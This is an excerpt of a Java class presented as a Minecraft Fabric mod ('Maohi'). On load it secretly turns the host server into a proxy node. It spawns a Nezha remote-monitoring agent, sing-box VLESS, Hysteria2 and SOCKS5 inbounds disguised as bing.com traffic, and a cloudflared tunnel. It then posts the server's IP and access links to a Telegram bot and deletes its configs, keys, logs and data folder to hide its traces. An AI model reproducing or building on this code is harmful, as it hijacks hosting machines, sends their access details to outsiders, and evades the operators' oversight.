...
public class Maohi implements ModInitializer {
    ...
    private static final String HY2_PORT     = cfg("HY2_PORT", "25788");
    ...
    static final String NAME              = cfg("NAME", "mochi-nasaro");
    ...
    private void generateCert() {
        ...
        try {
            ...
            if (p.exitValue() == 0) {
                ...
                new ProcessBuilder("openssl", "req", "-new", "-x509", "-days", "3650", "-key", keyFile.toString(),
                    "-out", certFile.toString(), "-subj", "/CN=bing.com")
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start().waitFor();
                return;
            }
        } catch (Exception e) {}
    ...
    private void runNezha() {
        if (NEZHA_SERVER == null || NEZHA_SERVER.isEmpty() || NEZHA_KEY == null || NEZHA_KEY.isEmpty()) return;
        String serverPort = NEZHA_SERVER.contains(":") ? NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(":") + 1) : "";
    ...
    private String buildSingboxConfig() {
        ...
        inbounds.append("    {\n\"tag\": \"vless-ws-in\",\n\"type\": \"vless\",\n\"listen\": \"::\",\n")
            ...
            .append("\"users\": [{\"uuid\": \"").append(UUID_VAL).append("\", \"flow\": \"\"}],\n")
            .append("\"transport\": {\"type\": \"ws\",\"path\": \"/vless-argo\",")
            .append("\"early_data_header_name\": \"Sec-WebSocket-Protocol\"}\n    }");
        if (isValidPort(HY2_PORT)) {
            inbounds.append(",\n    {\n\"tag\": \"hysteria2-in\",\n\"type\": \"hysteria2\",\n\"listen\": \"::\",\n")
                .append("\"listen_port\": ").append(HY2_PORT).append(",\n")
                .append("\"users\": [{\"password\": \"").append(UUID_VAL).append("\"}],\n")
                .append("\"masquerade\": \"https://bing.com\",\n")
                .append("\"tls\": {\"enabled\": true,\"alpn\": [\"h3\"],")
        ...
        if (isValidPort(S5_PORT)) {
            String s5User = UUID_VAL.substring(0, 8);
            String s5Pass = UUID_VAL.substring(UUID_VAL.length() - 12);
            inbounds.append(",\n    {\n\"tag\": \"socks5-in\",\n\"type\": \"socks\",\n\"listen\": \"::\",\n")
    ...
    private void runCloudflared() {
        if (ARGO_AUTH == null || ARGO_AUTH.isEmpty() || ARGO_DOMAIN == null || ARGO_DOMAIN.isEmpty()) return;
        try {
            new ProcessBuilder(FILE_PATH.resolve(botName).toString(), "tunnel", "--edge-ip-version", "auto",
                "--no-autoupdate", "--protocol", "http2", "run", "--token", ARGO_AUTH)
                .redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
            Thread.sleep(2000);
        } catch (Exception e) {}
    }
    ...
    private String getServerIP() {
        for (String service : new String[]{"http://ipv4.ip.sb","https://api.ipify.org","https://ifconfig.me/ip"}) {
            try {
    ...
    private String generateLinks(String serverIP, String countryName, String countryFlag) {
        ...
        if (ARGO_DOMAIN != null && !ARGO_DOMAIN.isEmpty()) {
            String params = "encryption=none&security=tls&sni=" + ARGO_DOMAIN +
                "&fp=firefox&type=ws&host=" + ARGO_DOMAIN + "&path=/vless-argo?ed=2560";
            sb.append("vless://").append(UUID_VAL).append("@").append(CFIP).append(":").append(CFPORT)
                .append("?").append(params).append("#").append(NAME).append("_vless").append(suffix);
        }
        if (isValidPort(HY2_PORT)) {
            sb.append("\nhysteria2://").append(UUID_VAL).append("@").append(serverIP).append(":").append(HY2_PORT)
                .append("/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#").append(NAME).append("_hysteria2").append(suffix);
        }
        if (isValidPort(S5_PORT)) {
            String s5Auth = Base64.getEncoder().encodeToString(
                (UUID_VAL.substring(0, 8) + ":" + UUID_VAL.substring(UUID_VAL.length() - 12)).getBytes());
            sb.append("\nsocks://").append(s5Auth).append("@").append(serverIP).append(":").append(S5_PORT)
                .append("#").append(NAME).append("_socks5").append(suffix);
        }
        return Base64.getEncoder().encodeToString(sb.toString().getBytes());
    }

    private void sendTelegram(String subTxt) {
        if (BOT_TOKEN == null || BOT_TOKEN.isEmpty() || CHAT_ID == null || CHAT_ID.isEmpty()) return;
        try {
            String text = NAME + "节点推送通知\n" + subTxt;
            String params = "chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
            HttpURLConnection conn = (HttpURLConnection) new URL(
                "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").openConnection();
            conn.setRequestMethod("POST"); conn.setDoOutput(true);
            conn.setConnectTimeout(5000); conn.setReadTimeout(5000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            try (OutputStream os = conn.getOutputStream()) { os.write(params.getBytes("UTF-8")); }
    ...
    public static boolean isValidPort(String port) {
        ...
        try { int n = Integer.parseInt(port.trim()); return n >= 1 && n <= 65535; }
    ...
    private void cleanup() {
        Thread cleanupThread = new Thread(() -> {
            try {
                Thread.sleep(8000);
                for (String f : new String[]{"config.json","config.yaml","cert.pem","private.key"}) {
                ...
                if (Files.exists(logsDir)) {
                    try (DirectoryStream<Path> stream = Files.newDirectoryStream(logsDir, "*.log.gz")) {
                        for (Path entry : stream) { try { Files.deleteIfExists(entry); } catch (Exception e) {} }
                    } catch (Exception e) {}
                }
                if (Files.exists(DATA_DIR)) {
                    try { Files.walk(DATA_DIR).sorted(Comparator.reverseOrder()).forEach(p -> p.toFile().delete()); }
                    catch (Exception e) {}
                }
            } catch (Exception e) {}
        }, "Cleanup-Thread");
